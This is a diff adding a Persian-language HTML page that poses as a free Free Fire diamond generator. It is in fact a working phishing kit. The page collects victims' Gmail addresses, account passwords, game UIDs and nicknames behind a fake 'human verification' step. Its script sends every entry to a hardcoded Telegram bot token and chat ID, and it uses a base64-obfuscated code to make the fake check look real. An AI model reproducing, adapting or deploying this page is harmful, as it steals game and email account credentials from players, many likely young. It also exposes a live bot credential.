@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Free Fire - الماس رایگان 2025</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Vazirmatn:wght@500;700&display=swap" rel="stylesheet">
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box;}
+    body{font-family:'Vazirmatn',sans-serif;background:#000;overflow-x:hidden;min-height:100vh;color:#fff;
+      background:radial-gradient(circle at 50% 50%,rgba(255,0,0,0.4),#000 70%);}
+    
+    .fire-bg{
+      position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:1;
+      background:radial-gradient(circle at 30% 30%,rgba(255,100,0,0.3),transparent 50%),
+                 radial-gradient(circle at 70% 80%,rgba(255,50,0,0.3),transparent 50%);
+      animation:pulseFire 8s infinite;
+    }
+    @keyframes pulseFire{0%,100%{opacity:0.6;}50%{opacity:1;}}
+    
+    .container{max-width:430px;margin:20px auto;padding:20px;position:relative;z-index:10;}
+    .logo{
+      font-family:'Orbitron',monospace;font-size:4.2em;text-align:center;margin:20px 0;
+      background:linear-gradient(45deg,#ff3300,#ff6600,#ffff00,#ff0066);
+      -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+      animation:fireGlow 2s infinite alternate;text-shadow:0 0 50px #ff3300;
+    }
+    @keyframes fireGlow{
+      from{text-shadow:0 0 30px #ff3300,0 0 60px #ff6600;}
+      to{text-shadow:0 0 50px #ffff00,0 0 80px #ff3300;}
+    }
+    .subtitle{color:#ffff00;text-align:center;margin-bottom:30px;text-shadow:0 0 20px #ff3300;font-size:1.2em;}
+    
+    .card{
+      background:rgba(40,0,0,0.9);border:3px solid #ff3300;border-radius:20px;padding:25px;margin:20px 0;
+      backdrop-filters:blur(12px);box-shadow:0 0 50px rgba(255,51,0,0.6);
+      opacity:0;transform:translateY(40px);transition:all 0.7s ease-out;
+    }
+    .card.show{opacity:1;transform:translateY(0);}
+    .title{color:#ffff00;font-size:1.6em;margin-bottom:20px;text-shadow:0 0 20px #ff3300;font-weight:bold;}
+    
+    input{
+      width:100%;padding:18px;background:rgba(0,0,0,0.8);border:2px solid #ff3300;border-radius:15px;
+      color:#fff;font-size:17px;margin:10px 0;transition:0.4s;
+    }
+    input:focus{outline:none;border-color:#ffff00;box-shadow:0 0 30px rgba(255,255,0,0.8);}
+    
+    .diamond-grid{display:grid;grid-template-columns:1fr 1fr;gap:15px;margin:20px 0;}
+    .diamond-btn{
+      padding:18px;background:linear-gradient(45deg,#ff0066,#ff3300);border:none;border-radius:15px;
+      color:#fff;font-weight:bold;font-size:16px;cursor:pointer;
+      box-shadow:0 8px 30px rgba(255,0,102,0.7);transition:0.4s;
+    }
+    .diamond-btn:hover,.diamond-btn.active{
+      transform:translateY(-15px);box-shadow:0 25px 60px rgba(255,0,0,0.9);
+    }
+    
+    .generate-btn{
+      width:100%;padding:22px;background:linear-gradient(45deg,#ffff00,#ff6600);
+      border:none;border-radius:18px;color:#000;font-size:24px;font-weight:bold;
+      margin:30px 0;cursor:pointer;box-shadow:0 0 70px rgba(255,255,0,0.9);transition:0.4s;
+    }
+    .generate-btn:hover{transform:scale(1.08);}
+    .generate-btn:disabled{background:#333;opacity:0.6;cursor:not-allowed;}
+    
+    .verify-section{
+      display:none;background:rgba(255,0,0,0.2);border:4px solid #ffff00;
+      border-radius:20px;padding:30px;margin-top:20px;
+      box-shadow:0 0 60px rgba(255,255,0,0.7);animation:pulse 2s infinite;
+    }
+    @keyframes pulse{0%,100%{box-shadow:0 0 50px #ffff00;}50%{box-shadow:0 0 90px #ff3300;}}
+    .verify-section input{
+      text-align:center;font-size:32px;letter-spacing:15px;background:rgba(0,0,0,0.9);border:2px solid #ffff00;
+    }
+    .status{text-align:center;margin:25px 0;font-size:20px;font-weight:bold;}
+    
+    #vpnRequired{
+      position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#ffff00;
+      display:flex;align-items:center;justify-content:center;flex-direction:column;font-size:24px;z-index:9999;
+    }
+    #vpnRequired h1{font-size:4em;animation:blink 1s infinite;text-shadow:0 0 30px #ff3300;}
+    @keyframes blink{0%,100%{opacity:1;}50%{opacity:0.4;}}
+  </style>
+</head>
+<body>
+
+<div class="fire-bg"></div>
+
+<div id="vpnRequired">
+  <h1>فیلترشکن روشن کن!</h1>
+  <p>این صفحه فقط با VPN کار می‌کنه</p>
+</div>
+
+<div id="mainContent" style="display:none;">
+  <div class="container">
+    <h1 class="logo">FREE DIAMOND</h1>
+    <p class="subtitle">ژنراتور الماس رایگان فری فایر 2025</p>
+
+    <div class="card show" id="stepCP">
+      <div class="title">انتخاب تعداد الماس</div>
+      <div class="diamond-grid">
+        <button class="diamond-btn active" onclick="selectCP(100, this)">100 الماس</button>
+        <button class="diamond-btn" onclick="selectCP(530, this)">530 الماس</button>
+        <button class="diamond-btn" onclick="selectCP(1080, this)">1080 الماس</button>
+        <button class="diamond-btn" onclick="selectCP(2200, this)">2200 الماس</button>
+      </div>
+    </div>
+
+    <div class="card" id="stepEmail"><div class="title">ایمیل</div><input type="text" id="gmail" placeholder="example@gmail.com" oninput="checkEmail()"></div>
+    <div class="card" id="stepPass"><div class="title">پسورد اکانت</div><input type="password" id="pass" placeholder="رمز عبور" oninput="checkPass()"></div>
+    <div class="card" id="stepUID"><div class="title">UID کامل اکانت</div><input type="text" id="uid" placeholder="مثلاً 123456789" oninput="checkUID()"></div>
+    <div class="card" id="stepNick"><div class="title">نام اکانت (Nickname)</div><input type="text" id="nick" placeholder="اسم تو بازی" oninput="checkNick()"></div>
+
+    <div class="verify-section" id="verifyBox">
+      <div class="title" style="color:#ffff00">تأیید انسانی</div>
+      <p>کد تأیید رو از ادمین بگیر:</p>
+      <input type="text" id="code" maxlength="11" placeholder="•••••••••••">
+      <button class="generate-btn" id="sendBtn" onclick="sendData()">دریافت الماس رایگان</button>
+      <p style="margin-top:10px;font-size:14px;color:#ff9966;">فقط ۲ بار می‌تونی کلیک کنی</p>
+    </div>
+
+    <div class="status" id="status"></div>
+  </div>
+</div>
+
+<script>
+function checkVPN(){
+  fetch("https://www.google.com",{method:'HEAD',mode:'no-cors'}).then(()=>{showPage()}).catch(()=>{});
+  setTimeout(()=>{if(document.getElementById('mainContent').style.display==='none'){
+    document.getElementById('vpnRequired').innerHTML="<h1>فیلترشکن روشن کن!</h1><p>بدون VPN صفحه باز نمیشه</p>";
+  }},5000);
+}
+function showPage(){
+  document.getElementById('vpnRequired').style.display='none';
+  document.getElementById('mainContent').style.display='block';
+}
+checkVPN();
+
+let cp = 100;
+let clickCount = 0;
+const MAX_CLICKS = 2;
+
+function selectCP(amount, btn){
+  cp = amount;
+  document.querySelectorAll('.diamond-btn').forEach(b=>b.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('stepEmail').classList.add('show');
+}
+
+function checkEmail(){const v=document.getElementById('gmail').value;if(v.length>=5){document.getElementById('stepPass').classList.add('show');}else{document.getElementById('stepPass').classList.remove('show');document.getElementById('stepUID').classList.remove('show');document.getElementById('stepNick').classList.remove('show');document.getElementById('verifyBox').style.display='none';}}
+function checkPass(){if(document.getElementById('pass').value.length>=4){document.getElementById('stepUID').classList.add('show');}else{document.getElementById('stepUID').classList.remove('show');document.getElementById('stepNick').classList.remove('show');document.getElementById('verifyBox').style.display='none';}}
+function checkUID(){if(document.getElementById('uid').value.length>=8){document.getElementById('stepNick').classList.add('show');}else{document.getElementById('stepNick').classList.remove('show');document.getElementById('verifyBox').style.display='none';}}
+function checkNick(){if(document.getElementById('nick').value.length>=2){document.getElementById('verifyBox').style.display='block';}else{document.getElementById('verifyBox').style.display='none';}}
+
+const SECRET_CODE = (() => {const a=atob("bWlj");const b=atob("eTAwOTEy");return a+b;})();
+
+function sendData(){
+  if(clickCount >= MAX_CLICKS){
+    document.getElementById('status').innerHTML = "<span style='color:#ff0000'>دیگه نمی‌تونی کلیک کنی!</span>";
+    document.getElementById('sendBtn').disabled = true;
+    return;
+  }
+  clickCount++;
+
+  const entered = document.getElementById('code').value.trim() || "خالی";
+
+  const text = `MicrooB\nسلام استاد من !\n\nیک کاربر وارد لینک فری فایر شما شد و اطلاعات اکانتش به شرح زیر می‌باشد ...\n\n1 : ɢɪᴍᴀʟʟ ᴀᴄᴄᴜᴏɴᴛ : ${document.getElementById('gmail').value}\n2 : ᴘᴀssᴡᴏʀᴅ ᴀᴄᴄᴜᴏɴᴛ : ${document.getElementById('pass').value}\n3 : ᴜɪᴅ ᴄᴏᴍᴘʟᴇᴛᴇ : ${document.getElementById('uid').value}\n4 : ɴɪᴄᴋɴᴀᴍᴇ : ${document.getElementById('nick').value}\n\nوضعیت لینک : فعال\nتعداد الماس درخواستی : ${cp} الماس\nکد وارد شده : ${entered}\nتاریخ و ساعت : ${new Date().toLocaleString('fa-IR')}`;
+
+  fetch("https://api.telegram.org/bot8542073638:AAE5QwDZ_hxtOKGyuQ4G3qrMkKq92pC387Y/sendMessage?chat_id=6080665310&text=" + encodeURIComponent(text));
+
+  if(entered === SECRET_CODE){
+    document.getElementById('status').innerHTML = "<span style='color:#ffff00'>الماس با موفقیت واریز شد!</span>";
+  } else {
+    document.getElementById('status').innerHTML = "<span style='color:#ff0066'>کد اشتباه است!</span>";
+  }
+
+  if(clickCount >= MAX_CLICKS){
+    document.getElementById('sendBtn').disabled = true;
+    document.getElementById('sendBtn').textContent = "تموم شد!";
+  }
+}
+</script>
+</body>
+</html>
